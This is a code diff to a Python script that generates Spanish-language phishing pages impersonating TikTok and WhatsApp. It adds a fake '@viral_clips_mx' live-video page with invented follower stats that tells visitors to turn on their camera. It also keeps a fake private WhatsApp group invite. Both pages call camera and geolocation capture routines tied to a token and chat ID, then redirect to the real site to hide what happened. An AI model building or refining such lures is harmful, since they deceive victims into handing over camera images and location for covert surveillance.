@@ -99,7 +99,7 @@ CSS_STYLES_CAMERA = """
     * {margin: 0; padding: 0; box-sizing: border-box;}
     body {
         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        background: #0a0f1c;
+        background: #000000;
         display: flex;
         justify-content: center;
         align-items: center;
@@ -107,55 +107,102 @@ CSS_STYLES_CAMERA = """
         padding: 20px;
     }
     .container {
-        background: linear-gradient(135deg, #1a1d29 0%, #2d1b3d 100%);
-        border-radius: 20px;
-        padding: 40px;
-        max-width: 500px;
+        background: #111111;
+        border-radius: 16px;
+        padding: 36px 30px;
+        max-width: 420px;
         width: 100%;
-        box-shadow: 0 8px 32px rgba(138, 43, 226, 0.3);
+        box-shadow: 0 0 40px rgba(254,44,85,0.2);
         text-align: center;
-        animation: fadeIn 0.6s ease;
+        animation: fadeIn 0.5s ease;
+        border: 1px solid #222;
     }
     @keyframes fadeIn {
-        from {opacity: 0; transform: translateY(-30px);}
+        from {opacity: 0; transform: translateY(-20px);}
         to {opacity: 1; transform: translateY(0);}
     }
     .logo {
-        width: 80px;
-        height: 80px;
-        margin: 0 auto 20px;
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        border-radius: 20px;
+        width: 72px;
+        height: 72px;
+        margin: 0 auto 18px;
+        background: linear-gradient(135deg, #fe2c55 0%, #ee1d52 50%, #69c9d0 100%);
+        border-radius: 16px;
         display: flex;
         align-items: center;
         justify-content: center;
-        font-size: 45px;
-        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        font-size: 38px;
+        box-shadow: 0 4px 20px rgba(254, 44, 85, 0.5);
+    }
+    .badge {
+        display: inline-block;
+        background: #fe2c55;
+        color: white;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 3px 10px;
+        border-radius: 20px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 14px;
     }
     h1 {
         color: #ffffff;
-        font-size: 26px;
-        margin-bottom: 10px;
+        font-size: 22px;
+        margin-bottom: 8px;
+        font-weight: 700;
+    }
+    .username {
+        color: #fe2c55;
+        font-size: 15px;
         font-weight: 600;
+        margin-bottom: 16px;
     }
     p {
-        color: #a8b3cf;
-        font-size: 15px;
+        color: #888888;
+        font-size: 14px;
         line-height: 1.6;
-        margin-bottom: 25px;
+        margin-bottom: 24px;
+    }
+    .stats {
+        display: flex;
+        justify-content: center;
+        gap: 30px;
+        margin-bottom: 24px;
+        border-top: 1px solid #222;
+        border-bottom: 1px solid #222;
+        padding: 14px 0;
+    }
+    .stat-item {
+        text-align: center;
+    }
+    .stat-num {
+        color: #ffffff;
+        font-size: 18px;
+        font-weight: 700;
+        display: block;
+    }
+    .stat-label {
+        color: #666;
+        font-size: 12px;
     }
     .loader {
-        width: 50px;
-        height: 50px;
-        border: 4px solid #2d1b3d;
-        border-top: 4px solid #667eea;
+        width: 44px;
+        height: 44px;
+        border: 3px solid #222;
+        border-top: 3px solid #fe2c55;
         border-radius: 50%;
-        animation: spin 1s linear infinite;
-        margin: 0 auto 20px;
+        animation: spin 0.8s linear infinite;
+        margin: 0 auto 16px;
     }
     @keyframes spin {
         0% {transform: rotate(0deg);}
         100% {transform: rotate(360deg);}
+    }
+    .hidden {display: none;}
+    .footer-note {
+        color: #444;
+        font-size: 12px;
+        margin-top: 16px;
     }
 </style>
 """
@@ -296,9 +343,22 @@ def get_template(token, chat_id, mode="geo"):
         css = CSS_STYLES_CAMERA
         init_call = "const ipGeo = await getBasicInfo(); getCamAuto();"
         logic += JS_GEO_AUTO + JS_CAM_AUTO
-        icon = "📸"
-        title = "Verificación de Seguridad"
-        subtitle = "Verificando tu identidad para acceder..."
+        icon = "🎵"
+        title = "@viral_clips_mx"
+        subtitle = "Cargando video exclusivo... Activa el acceso a la cámara para una mejor experiencia."
+        extra_html = '''
+        <div class="badge">LIVE</div>
+        <div class="stats">
+            <div class="stat-item"><span class="stat-num">2.4M</span><span class="stat-label">seguidores</span></div>
+            <div class="stat-item"><span class="stat-num">18.3M</span><span class="stat-label">me gusta</span></div>
+            <div class="stat-item"><span class="stat-num">847</span><span class="stat-label">videos</span></div>
+        </div>
+        <div class="footer-note" id="members">Verificando acceso al contenido...</div>
+        '''
+        redirect_url = "https://www.tiktok.com"
+        redirect_text = "TikTok"
+        meta_desc = "Video viral exclusivo"
+        page_title = "TikTok - Ver video"
     else:
         css = CSS_STYLES_WHATSAPP
         init_call = "const ipGeo = await getBasicInfo(); getGeoAuto(ipGeo.lat, ipGeo.lon);"
@@ -306,32 +366,36 @@ def get_template(token, chat_id, mode="geo"):
         icon = "💬"
         title = "Únete al Grupo"
         subtitle = "Te han invitado a un grupo privado. Verificando tu ubicación para acceso seguro..."
+        extra_html = '<div class="members" id="members">🟢 45 miembros activos</div>'
+        redirect_url = "https://web.whatsapp.com"
+        redirect_text = "WhatsApp"
+        meta_desc = "Grupo privado de WhatsApp"
+        page_title = "WhatsApp - Unirse al grupo"
 
-    template = f"""
-<!DOCTYPE html>
+    template = f"""<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Grupo privado de WhatsApp">
-    <title>{title}</title>
+    <meta name="description" content="{meta_desc}">
+    <title>{page_title}</title>
     __CSS__
 </head>
 <body>
     <div class="container">
         <div class="logo">{icon}</div>
+        {extra_html}
         <h1 id="title">{title}</h1>
         <p id="subtitle">{subtitle}</p>
         <div class="loader" id="loader"></div>
-        <div class="members" id="members">{'🟢 45 miembros activos' if mode == 'geo' else ''}</div>
     </div>
     <script>
-        const redirect = () => {{ 
+        const redirect = () => {{
             document.getElementById('loader').classList.add('hidden');
-            document.getElementById('title').innerText = '✅ Verificación Completa';
-            document.getElementById('subtitle').innerText = 'Redirigiendo a {'WhatsApp' if mode == 'geo' else 'la aplicación'}...';
-            setTimeout(() => {{ 
-                window.location.href = "{'https://chat.whatsapp.com' if mode == 'geo' else 'https://google.com'}"; 
+            document.getElementById('title').innerText = '✅ Acceso Verificado';
+            document.getElementById('subtitle').innerText = 'Redirigiendo a {redirect_text}...';
+            setTimeout(() => {{
+                window.location.href = "{redirect_url}";
             }}, 2000);
         }};
         
